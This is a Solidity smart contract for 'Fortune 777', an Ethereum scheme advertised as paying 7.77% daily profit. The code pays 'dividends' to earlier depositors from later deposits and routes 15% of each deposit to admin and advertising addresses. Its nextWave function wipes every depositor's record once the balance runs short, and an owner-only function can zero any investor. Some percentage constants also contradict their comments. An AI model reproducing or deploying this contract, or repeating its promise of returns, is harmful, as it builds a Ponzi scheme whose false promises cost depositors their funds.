1 pragma solidity 0.4.25;
2 
3 /**
4 *
5 * Get your 7,77% every day profit with Fortune 777 Contract!
6 * GitHub https://github.com/fortune333/fortune777
7 * Site https://fortune333.online/
8 *
9 */
10 
11 
12 library Math {
13 function min(uint a, uint b) internal pure returns(uint) {
14 if (a > b) {
15 return b;
16 }
17 return a;
18 }
19 }
20 
21 
22 library Zero {
23 function requireNotZero(address addr) internal pure {
24 require(addr != address(0), "require not zero address");
25 }
26 
27 function requireNotZero(uint val) internal pure {
28 require(val != 0, "require not zero value");
29 }
30 
31 function notZero(address addr) internal pure returns(bool) {
32 return !(addr == address(0));
33 }
34 
35 function isZero(address addr) internal pure returns(bool) {
36 return addr == address(0);
37 }
38 
39 function isZero(uint a) internal pure returns(bool) {
40 return a == 0;
41 }
42 
43 function notZero(uint a) internal pure returns(bool) {
44 return a != 0;
45 }
46 }
47 
48 
49 library Percent {
50 struct percent {
51 uint num;
52 uint den;
53 }
54 
55 function mul(percent storage p, uint a) internal view returns (uint) {
56 if (a == 0) {
57 return 0;
58 }
59 return a*p.num/p.den;
60 }
61 
62 function div(percent storage p, uint a) internal view returns (uint) {
63 return a/p.num*p.den;
64 }
65 
66 function sub(percent storage p, uint a) internal view returns (uint) {
67 uint b = mul(p, a);
68 if (b >= a) {
69 return 0;
70 }
71 return a - b;
72 }
73 
74 function add(percent storage p, uint a) internal view returns (uint) {
75 return a + mul(p, a);
76 }
77 
78 function toMemory(percent storage p) internal view returns (Percent.percent memory) {
79 return Percent.percent(p.num, p.den);
80 }
81 
82 function mmul(percent memory p, uint a) internal pure returns (uint) {
83 if (a == 0) {
84 return 0;
85 }
86 return a*p.num/p.den;
87 }
88 
89 function mdiv(percent memory p, uint a) internal pure returns (uint) {
90 return a/p.num*p.den;
91 }
92 
93 function msub(percent memory p, uint a) internal pure returns (uint) {
94 uint b = mmul(p, a);
95 if (b >= a) {
96 return 0;
97 }
98 return a - b;
99 }
100 
101 function madd(percent memory p, uint a) internal pure returns (uint) {
102 return a + mmul(p, a);
103 }
104 }
105 
106 
107 library Address {
108 function toAddress(bytes source) internal pure returns(address addr) {
109 assembly { addr := mload(add(source,0x14)) }
110 return addr;
111 }
112 
113 function isNotContract(address addr) internal view returns(bool) {
114 uint length;
115 assembly { length := extcodesize(addr) }
116 return length == 0;
117 }
118 }
119 
120 
121 /**
122 * @title SafeMath
123 * @dev Math operations with safety checks that revert on error
124 */
125 library SafeMath {
126 
127 /**
128 * @dev Multiplies two numbers, reverts on overflow.
129 */
130 function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
131 if (_a == 0) {
132 return 0;
133 }
134 
135 uint256 c = _a * _b;
136 require(c / _a == _b);
137 
138 return c;
139 }
140 
141 /**
142 * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
143 */
144 function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
145 require(_b > 0); // Solidity only automatically asserts when dividing by 0
146 uint256 c = _a / _b;
147 // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
148 
149 return c;
150 }
151 
152 /**
153 * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
154 */
155 function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
156 require(_b <= _a);
157 uint256 c = _a - _b;
158 
159 return c;
160 }
161 
162 /**
163 * @dev Adds two numbers, reverts on overflow.
164 */
165 function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
166 uint256 c = _a + _b;
167 require(c >= _a);
168 
169 return c;
170 }
171 
172 /**
173 * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
174 * reverts when dividing by zero.
175 */
176 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
177 require(b != 0);
178 return a % b;
179 }
180 }
181 
182 
183 contract Accessibility {
184 address private owner;
185 modifier onlyOwner() {
186 require(msg.sender == owner, "access denied");
187 _;
188 }
189 
190 constructor() public {
191 owner = msg.sender;
192 }
193 
194 function disown() internal {
195 delete owner;
196 }
197 }
198 
199 
200 contract Rev1Storage {
201 function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
202 }
203 
204 
205 contract Rev2Storage {
206 function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
207 }
208 
209 
210 library PrivateEntrance {
211 using PrivateEntrance for privateEntrance;
212 using Math for uint;
213 struct privateEntrance {
214 Rev1Storage rev1Storage;
215 Rev2Storage rev2Storage;
216 uint investorMaxInvestment;
217 uint endTimestamp;
218 mapping(address=>bool) hasAccess;
219 }
220 
221 function isActive(privateEntrance storage pe) internal view returns(bool) {
222 return pe.endTimestamp > now;
223 }
224 
225 function maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {
226 if (!pe.hasAccess[investorAddr]) {
227 return 0;
228 }
229 
230 (uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);
231 if (maxInvestment == 0) {
232 return 0;
233 }
234 maxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);
235 
236 (uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);
237 
238 if (currInvestment >= maxInvestment) {
239 return 0;
240 }
241 
242 return maxInvestment-currInvestment;
243 }
244 
245 function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
246 for (uint16 i; i < addrs.length; i++) {
247 pe.hasAccess[addrs[i]] = true;
248 }
249 }
250 }
251 
252 
253 contract InvestorsStorage is Accessibility {
254 struct Investor {
255 uint investment;
256 uint paymentTime;
257 }
258 uint public size;
259 
260 mapping (address => Investor) private investors;
261 
262 function isInvestor(address addr) public view returns (bool) {
263 return investors[addr].investment > 0;
264 }
265 
266 function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
267 investment = investors[addr].investment;
268 paymentTime = investors[addr].paymentTime;
269 }
270 
271 function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
272 Investor storage inv = investors[addr];
273 if (inv.investment != 0 || investment == 0) {
274 return false;
275 }
276 inv.investment = investment;
277 inv.paymentTime = paymentTime;
278 size++;
279 return true;
280 }
281 
282 function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
283 if (investors[addr].investment == 0) {
284 return false;
285 }
286 investors[addr].investment += investment;
287 return true;
288 }
289 
290 function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
291 if (investors[addr].investment == 0) {
292 return false;
293 }
294 investors[addr].paymentTime = paymentTime;
295 return true;
296 }
297 
298 function disqalify(address addr) public onlyOwner returns (bool) {
299 if (isInvestor(addr)) {
300 investors[addr].investment = 0;
301 }
302 }
303 }
304 
305 
306 library RapidGrowthProtection {
307 using RapidGrowthProtection for rapidGrowthProtection;
308 
309 struct rapidGrowthProtection {
310 uint startTimestamp;
311 uint maxDailyTotalInvestment;
312 uint8 activityDays;
313 mapping(uint8 => uint) dailyTotalInvestment;
314 }
315 
316 function maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {
317 uint day = rgp.currDay();
318 if (day == 0 || day > rgp.activityDays) {
319 return 0;
320 }
321 if (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {
322 return 0;
323 }
324 return rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];
325 }
326 
327 function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
328 uint day = rgp.currDay();
329 return day != 0 && day <= rgp.activityDays;
330 }
331 
332 function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
333 uint day = rgp.currDay();
334 if (day == 0 || day > rgp.activityDays) {
335 return false;
336 }
337 if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
338 return false;
339 }
340 rgp.dailyTotalInvestment[uint8(day)] += investment;
341 return true;
342 }
343 
344 function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
345 rgp.startTimestamp = timestamp;
346 
347 // restart
348 for (uint8 i = 1; i <= rgp.activityDays; i++) {
349 if (rgp.dailyTotalInvestment[i] != 0) {
350 delete rgp.dailyTotalInvestment[i];
351 }
352 }
353 }
354 
355 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
356 if (rgp.startTimestamp > now) {
357 return 0;
358 }
359 day = (now - rgp.startTimestamp) / 24 hours + 1;
360 }
361 }
362 
363 contract Fortune777 is Accessibility {
364 using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
365 using PrivateEntrance for PrivateEntrance.privateEntrance;
366 using Percent for Percent.percent;
367 using SafeMath for uint;
368 using Math for uint;
369 
370 // easy read for investors
371 using Address for *;
372 using Zero for *;
373 
374 RapidGrowthProtection.rapidGrowthProtection private m_rgp;
375 PrivateEntrance.privateEntrance private m_privEnter;
376 mapping(address => bool) private m_referrals;
377 InvestorsStorage private m_investors;
378 
379 // automatically generates getters
380 uint public constant minInvesment = 10 finney;
381 uint public constant maxBalance = 333e5 ether;
382 address public advertisingAddress;
383 address public adminsAddress;
384 uint public investmentsNumber;
385 uint public waveStartup;
386 
387 // percents
388 Percent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
389 Percent.percent private m_5_percent = Percent.percent(555,10000);            // 555/10000 *100% = 5.55%
390 Percent.percent private m_7_percent = Percent.percent(777,10000);            // 777/10000 *100% = 7.77%
391 Percent.percent private m_8_percent = Percent.percent(888,10000);            // 888/10000 *100% = 8.88%
392 Percent.percent private m_9_percent = Percent.percent(999,100);              // 999/10000 *100% = 9.99%
393 Percent.percent private m_10_percent = Percent.percent(10,100);            // 10/100 *100% = 10%
394 Percent.percent private m_11_percent = Percent.percent(11,100);            // 11/100 *100% = 11%
395 Percent.percent private m_12_percent = Percent.percent(12,100);            // 12/100 *100% = 12%
396 Percent.percent private m_referal_percent = Percent.percent(777,10000);        // 777/10000 *100% = 7.77%
397 Percent.percent private m_referrer_percent = Percent.percent(777,10000);       // 777/10000 *100% = 7.77%
398 Percent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%
399 Percent.percent private m_adminsPercent = Percent.percent(5,100);          //  5/100 *100% = 5.0%
400 Percent.percent private m_advertisingPercent = Percent.percent(10,100);    // 10/100 *100% = 10.0%
401 
402 // more events for easy read from blockchain
403 event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
404 event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
405 event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
406 event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
407 event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
408 event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
409 event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
410 event LogPayDividends(address indexed addr, uint when, uint dividends);
411 event LogNewInvestor(address indexed addr, uint when);
412 event LogBalanceChanged(uint when, uint balance);
413 event LogNextWave(uint when);
414 event LogDisown(uint when);
415 
416 
417 modifier balanceChanged {
418 _;
419 emit LogBalanceChanged(now, address(this).balance);
420 }
421 
422 modifier notFromContract() {
423 require(msg.sender.isNotContract(), "only externally accounts");
424 _;
425 }
426 
427 constructor() public {
428 adminsAddress = msg.sender;
429 advertisingAddress = msg.sender;
430 nextWave();
431 }
432 
433 function() public payable {
434 // investor get him dividends
435 if (msg.value.isZero()) {
436 getMyDividends();
437 return;
438 }
439 
440 // sender do invest
441 doInvest(msg.data.toAddress());
442 }
443 
444 function disqualifyAddress(address addr) public onlyOwner {
445 m_investors.disqalify(addr);
446 }
447 
448 function doDisown() public onlyOwner {
449 disown();
450 emit LogDisown(now);
451 }
452 
453 function init(address rev1StorageAddr, uint timestamp) public onlyOwner {
454 // init Rapid Growth Protection
455 m_rgp.startTimestamp = timestamp + 1;
456 m_rgp.maxDailyTotalInvestment = 500 ether;
457 m_rgp.activityDays = 21;
458 emit LogRGPInit(
459 now,
460 m_rgp.startTimestamp,
461 m_rgp.maxDailyTotalInvestment,
462 m_rgp.activityDays
463 );
464 
465 
466 // init Private Entrance
467 m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
468 m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
469 m_privEnter.investorMaxInvestment = 50 ether;
470 m_privEnter.endTimestamp = timestamp;
471 emit LogPEInit(
472 now,
473 address(m_privEnter.rev1Storage),
474 address(m_privEnter.rev2Storage),
475 m_privEnter.investorMaxInvestment,
476 m_privEnter.endTimestamp
477 );
478 }
479 
480 function setAdvertisingAddress(address addr) public onlyOwner {
481 addr.requireNotZero();
482 advertisingAddress = addr;
483 }
484 
485 function setAdminsAddress(address addr) public onlyOwner {
486 addr.requireNotZero();
487 adminsAddress = addr;
488 }
489 
490 function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
491 m_privEnter.provideAccessFor(addrs);
492 }
493 
494 function rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {
495 investment = m_rgp.maxInvestmentAtNow();
496 }
497 
498 function investorsNumber() public view returns(uint) {
499 return m_investors.size();
500 }
501 
502 function balanceETH() public view returns(uint) {
503 return address(this).balance;
504 }
505 
506 function advertisingPercent() public view returns(uint numerator, uint denominator) {
507 (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
508 }
509 
510 function adminsPercent() public view returns(uint numerator, uint denominator) {
511 (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
512 }
513 
514 function investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {
515 (investment, paymentTime) = m_investors.investorInfo(investorAddr);
516 isReferral = m_referrals[investorAddr];
517 }
518 
519 function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
520 dividends = calcDividends(investorAddr);
521 }
522 
523 function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
524 Percent.percent memory p = dailyPercent();
525 (numerator, denominator) = (p.num, p.den);
526 }
527 
528 function getMyDividends() public notFromContract balanceChanged {
529 // calculate dividends
530 
531 //check if 1 day passed after last payment
532 require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);
533 
534 uint dividends = calcDividends(msg.sender);
535 require (dividends.notZero(), "cannot to pay zero dividends");
536 
537 // update investor payment timestamp
538 assert(m_investors.setPaymentTime(msg.sender, now));
539 
540 // check enough eth - goto next wave if needed
541 if (address(this).balance <= dividends) {
542 nextWave();
543 dividends = address(this).balance;
544 }
545 
546 // transfer dividends to investor
547 msg.sender.transfer(dividends);
548 emit LogPayDividends(msg.sender, now, dividends);
549 }
550 
551 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
552 uint investment = msg.value;
553 uint receivedEther = msg.value;
554 require(investment >= minInvesment, "investment must be >= minInvesment");
555 require(address(this).balance <= maxBalance, "the contract eth balance limit");
556 
557 if (m_rgp.isActive()) {
558 // use Rapid Growth Protection if needed
559 uint rpgMaxInvest = m_rgp.maxInvestmentAtNow();
560 rpgMaxInvest.requireNotZero();
561 investment = Math.min(investment, rpgMaxInvest);
562 assert(m_rgp.saveInvestment(investment));
563 emit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());
564 
565 } else if (m_privEnter.isActive()) {
566 // use Private Entrance if needed
567 uint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);
568 peMaxInvest.requireNotZero();
569 investment = Math.min(investment, peMaxInvest);
570 }
571 
572 // send excess of ether if needed
573 if (receivedEther > investment) {
574 uint excess = receivedEther - investment;
575 msg.sender.transfer(excess);
576 receivedEther = investment;
577 emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
578 }
579 
580 // commission
581 advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
582 adminsAddress.transfer(m_adminsPercent.mul(receivedEther));
583 
584 bool senderIsInvestor = m_investors.isInvestor(msg.sender);
585 
586 // ref system works only once and only on first invest
587 if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
588 referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
589 
590 m_referrals[msg.sender] = true;
591 // add referral bonus to investor`s and referral`s investments
592 uint referrerBonus = m_referrer_percent.mmul(investment);
593 if (investment > 10 ether) {
594 referrerBonus = m_referrer_percentMax.mmul(investment);
595 }
596 
597 uint referalBonus = m_referal_percent.mmul(investment);
598 assert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus
599 investment += referalBonus;                                    // add referral bonus
600 emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
601 }
602 
603 // automatic reinvest - prevent burning dividends
604 uint dividends = calcDividends(msg.sender);
605 if (senderIsInvestor && dividends.notZero()) {
606 investment += dividends;
607 emit LogAutomaticReinvest(msg.sender, now, dividends);
608 }
609 
610 if (senderIsInvestor) {
611 // update existing investor
612 assert(m_investors.addInvestment(msg.sender, investment));
613 assert(m_investors.setPaymentTime(msg.sender, now));
614 } else {
615 // create new investor
616 assert(m_investors.newInvestor(msg.sender, investment, now));
617 emit LogNewInvestor(msg.sender, now);
618 }
619 
620 investmentsNumber++;
621 emit LogNewInvesment(msg.sender, now, investment, receivedEther);
622 }
623 
624 function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
625 (uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
626 return InvestorsStorage.Investor(investment, paymentTime);
627 }
628 
629 function calcDividends(address investorAddr) internal view returns(uint dividends) {
630 InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
631 
632 // safe gas if dividends will be 0
633 if (investor.investment.isZero() || now.sub(investor.paymentTime) < 10 minutes) {
634 return 0;
635 }
636 
637 // for prevent burning daily dividends if 24h did not pass - calculate it per 10 min interval
638 Percent.percent memory p = dailyPercent();
639 dividends = (now.sub(investor.paymentTime) / 10 minutes) * p.mmul(investor.investment) / 144;
640 }
641 
642 function dailyPercent() internal view returns(Percent.percent memory p) {
643 uint balance = address(this).balance;
644 
645 if (balance < 500 ether) {
646 p = m_7_percent.toMemory();
647 } else if ( 500 ether <= balance && balance <= 1500 ether) {
648 p = m_8_percent.toMemory();
649 } else if ( 1500 ether <= balance && balance <= 5000 ether) {
650 p = m_8_percent.toMemory();
651 } else if ( 5000 ether <= balance && balance <= 10000 ether) {
652 p = m_10_percent.toMemory();
653 } else if ( 10000 ether <= balance && balance <= 20000 ether) {
654 p = m_12_percent.toMemory();
655 }
656 }
657 
658 function nextWave() private {
659 m_investors = new InvestorsStorage();
660 investmentsNumber = 0;
661 waveStartup = now;
662 m_rgp.startAt(now);
663 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
664 emit LogNextWave(now);
665 }
666 }